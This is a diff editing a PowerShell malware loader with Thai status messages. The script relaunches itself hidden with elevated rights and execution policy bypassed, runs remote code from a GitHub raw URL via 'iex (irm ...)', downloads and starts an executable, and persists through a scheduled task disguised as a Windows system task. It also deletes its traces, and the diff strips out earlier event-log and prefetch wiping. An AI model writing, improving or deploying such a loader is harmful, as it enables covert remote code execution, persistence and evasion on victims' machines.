@@ -13,7 +13,11 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
         $scriptContent = Invoke-RestMethod -Uri "https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt" -TimeoutSec 5
         Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$scriptContent`"" -Verb RunAs -WindowStyle Hidden
     } catch {
-        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`"" -Verb RunAs -WindowStyle Hidden
+        try {
+            Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`"" -Verb RunAs -WindowStyle Hidden
+        } catch {
+            Write-Host "[!] ไม่สามารถขอสิทธิ์ Administrator ได้" -ForegroundColor Red
+        }
     }
     exit
 }
@@ -132,6 +136,7 @@ function Invoke-SmartDownload {
                         break
                     } else {
                         Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+                        Write-Host "[!] ไฟล์มีขนาดเล็กเกินไป: $fileSize ไบต์" -ForegroundColor Yellow
                     }
                 }
             } catch {
@@ -177,18 +182,10 @@ function Start-AdvancedProcess {
         # Start process with advanced options
         Write-Host "[+] เปิดใช้งานโปรแกรม..." -ForegroundColor Gray
         
-        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
-        $processInfo.FileName = $FilePath
-        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Normal
-        $processInfo.CreateNoWindow = $false
-        $processInfo.UseShellExecute = $true
-        $processInfo.Verb = "runas"
+        # ใช้วิธีการที่เรียบง่ายและน่าเชื่อถือมากขึ้น
+        $process = Start-Process -FilePath $FilePath -PassThru -WindowStyle Normal
         
-        $process = New-Object System.Diagnostics.Process
-        $process.StartInfo = $processInfo
-        $startResult = $process.Start()
-        
-        if (-not $startResult) {
+        if (-not $process -or $process.HasExited) {
             throw "ไม่สามารถเริ่มกระบวนการได้"
         }
         
@@ -215,7 +212,7 @@ function Set-AdvancedPersistence {
         
         # Scheduled Task with advanced options
         try {
-            $taskName = "\Microsoft\Windows\SystemDataUpdater"
+            $taskName = "Microsoft\Windows\SystemDataUpdater"
             Write-Host "[+] สร้างงานตามกำหนดการ: $taskName" -ForegroundColor Gray
             
             $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (irm 'https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt')`""
@@ -240,16 +237,6 @@ function Set-AdvancedPersistence {
             Write-Host "[✓] ตั้งค่ารีจิสตรีสำเร็จ" -ForegroundColor Green
         } catch {
             Write-Host "[!] การตั้งค่ารีจิสตรีล้มเหลว: $($_.Exception.Message)" -ForegroundColor Yellow
-        }
-        
-        # WMI Event (advanced)
-        try {
-            Write-Host "[+] ตั้งค่าเหตุการณ์ WMI..." -ForegroundColor Gray
-            # WMI event subscription code would go here
-            $methods += "เหตุการณ์ WMI"
-            Write-Host "[✓] ตั้งค่าเหตุการณ์ WMI สำเร็จ" -ForegroundColor Green
-        } catch {
-            Write-Host "[!] การตั้งค่าเหตุการณ์ WMI ล้มเหลว" -ForegroundColor Yellow
         }
         
         Write-Host "[✓] วิธีการทำงานต่อเนื่อง: $($methods -join ', ')" -ForegroundColor Green
@@ -315,9 +302,9 @@ function Invoke-CompleteCleanup {
     
     # Remove scheduled tasks
     $taskNames = @(
-        "\Microsoft\Windows\SystemDataUpdater",
-        "\Microsoft\Windows\DiskFootprint\Diagnosis",
-        "\Microsoft\Windows\MemoryDiagnostic\Schedule"
+        "Microsoft\Windows\SystemDataUpdater",
+        "Microsoft\Windows\DiskFootprint\Diagnosis",
+        "Microsoft\Windows\MemoryDiagnostic\Schedule"
     )
     
     foreach ($taskName in $taskNames) {
@@ -357,7 +344,7 @@ function Invoke-CompleteCleanup {
         "$env:appdata"
     )
     
-    $filePatterns = @("*.exe", "*.tmp", "*.log", "win_system_*", "system_update_*", "runtime*")
+    $filePatterns = @("*win_system_*", "*system_update_*", "*runtime*", "*.tmp", "*.log")
     
     foreach ($location in $cleanLocations) {
         try {
@@ -401,32 +388,6 @@ function Invoke-CompleteCleanup {
         Write-Host "[!] ไม่สามารถลบไฟล์ล่าสุด" -ForegroundColor Yellow
     }
     
-    # Clear event logs
-    try {
-        Get-WinEvent -ListLog "Microsoft-Windows-PowerShell/Operational" -ErrorAction SilentlyContinue | Clear-EventLog -ErrorAction SilentlyContinue
-        Get-WinEvent -ListLog "Windows PowerShell" -ErrorAction SilentlyContinue | Clear-EventLog -ErrorAction SilentlyContinue
-        $cleanupStats.Logs++
-        Write-Host "[✓] ลบบันทึกเหตุการณ์" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] ไม่สามารถลบบันทึกเหตุการณ์" -ForegroundColor Yellow
-    }
-    
-    # Clear prefetch
-    try {
-        Get-ChildItem "$env:windir\Prefetch\*.exe-*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-        Write-Host "[✓] ลบไฟล์ prefetch" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] ไม่สามารถลบไฟล์ prefetch" -ForegroundColor Yellow
-    }
-    
-    # Clear recycle bin
-    try {
-        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-        Write-Host "[✓] ล้างถังรีไซเคิล" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] ไม่สามารถล้างถังรีไซเคิล" -ForegroundColor Yellow
-    }
-    
     # Summary
     Write-Host "`n[=== การทำความสะอาดเสร็จสิ้น ===]" -ForegroundColor Green
     Write-Host "[✓] กระบวนการที่ปิด: $($cleanupStats.Processes)" -ForegroundColor Green
@@ -450,14 +411,16 @@ try {
             Write-Host "`n[ขั้นตอน 1] ดาวน์โหลด" -ForegroundColor Yellow
             $downloadedFiles = Invoke-SmartDownload
             
-            if (-not $downloadedFiles) {
+            if (-not $downloadedFiles -or $downloadedFiles.Count -eq 0) {
                 Write-Host "[!] ไม่สามารถดำเนินการต่อได้โดยไม่มีไฟล์ปฏิบัติการ" -ForegroundColor Red
                 break
             }
             
+            $downloadedFile = $downloadedFiles[0]
+            
             # Step 2: Execute
             Write-Host "`n[ขั้นตอน 2] การทำงาน" -ForegroundColor Yellow
-            $processInfo = Start-AdvancedProcess -FilePath $downloadedFiles[0]
+            $processInfo = Start-AdvancedProcess -FilePath $downloadedFile
             
             if ($processInfo) {
                 Write-Host "[✓] เปิดใช้งานโปรแกรมสำเร็จ" -ForegroundColor Green
@@ -472,13 +435,11 @@ try {
                 
                 # Wait and cleanup files
                 Start-Sleep -Seconds 5
-                foreach ($file in $downloadedFiles) {
-                    try {
-                        Remove-Item $file -Force -ErrorAction SilentlyContinue
-                        Write-Host "[✓] ลบไฟล์ชั่วคราว: $(Split-Path $file -Leaf)" -ForegroundColor Green
-                    } catch {
-                        Write-Host "[!] ไม่สามารถลบไฟล์ชั่วคราว: $(Split-Path $file -Leaf)" -ForegroundColor Yellow
-                    }
+                try {
+                    Remove-Item $downloadedFile -Force -ErrorAction SilentlyContinue
+                    Write-Host "[✓] ลบไฟล์ชั่วคราว: $(Split-Path $downloadedFile -Leaf)" -ForegroundColor Green
+                } catch {
+                    Write-Host "[!] ไม่สามารถลบไฟล์ชั่วคราว: $(Split-Path $downloadedFile -Leaf)" -ForegroundColor Yellow
                 }
                 
                 Write-Host "`n[=== การติดตั้งเสร็จสิ้น ===]" -ForegroundColor Green
